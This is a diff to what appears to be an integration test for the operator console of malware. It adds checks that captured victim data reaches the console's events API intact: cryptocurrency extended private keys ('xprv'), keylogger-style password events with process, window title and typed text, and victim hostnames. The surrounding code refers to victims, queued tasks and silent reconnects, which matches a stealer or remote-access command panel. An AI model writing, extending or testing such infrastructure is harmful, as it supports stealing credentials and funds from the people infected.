@@ -9,6 +9,7 @@ import { sealSecret } from '../server/lib/crypto';
 import { signSession } from '../server/lib/jwt';
 import { applyTaskResult } from '../server/lib/task-result';
 import { expireQueued } from '../server/lib/tasks';
+import { eventView } from '../src/lib/event-view';
 
 const PORT = 4100;
 const BASE = `http://127.0.0.1:${PORT}`;
@@ -422,6 +423,17 @@ async function main(): Promise<void> {
     check('both events persisted without closing', stored.length === 2, String(stored.length));
     check('event legacy is byte-exact', stored[0]?.legacy === seedLegacy, JSON.stringify(stored[0]?.legacy));
     check('event data keeps secret_kind', (stored[1]?.data as any)?.secret_kind === 'xprv', JSON.stringify(stored[1]?.data));
+
+    // The console API is the render source: legacy and typed data must arrive together.
+    const eventsRes = await fetch(`${BASE}/api/console/events?victim=${victimB.id}&limit=10`, { headers: { cookie } });
+    const eventsBody = await eventsRes.json() as { items?: any[] };
+    const rendered = (eventsBody.items ?? []).find((row) => row.id === stored[0]?.id);
+    const renderedSecret = (eventsBody.items ?? []).find((row) => row.id === stored[1]?.id);
+    check('events API returns the exact legacy', eventsRes.status === 200 && eventView(rendered).legacy === seedLegacy, `${eventsRes.status} ${JSON.stringify(rendered?.legacy)}`);
+    check('events API returns kind and data', eventView(renderedSecret).fields.some((field) => field.label === 'secret_kind' && field.value === 'xprv') && eventView(renderedSecret).fields.some((field) => field.value === (stored[1]?.data as any)?.value), JSON.stringify(renderedSecret?.data));
+    check('events API carries the victim hostname', rendered?.victim?.hostname === 'ws-b', JSON.stringify(rendered?.victim));
+    const noLegacy = eventView({ kind: 'password', data: { process: 'x', title: 'y', text: 'z' } });
+    check('an empty legacy still renders the data', noLegacy.legacy === '' && noLegacy.fields.some((field) => field.value === 'z'), JSON.stringify(noLegacy));
 
     // A silent reconnect has no result in time: the panel says unknown, not timeout.
     mode = 'silent';
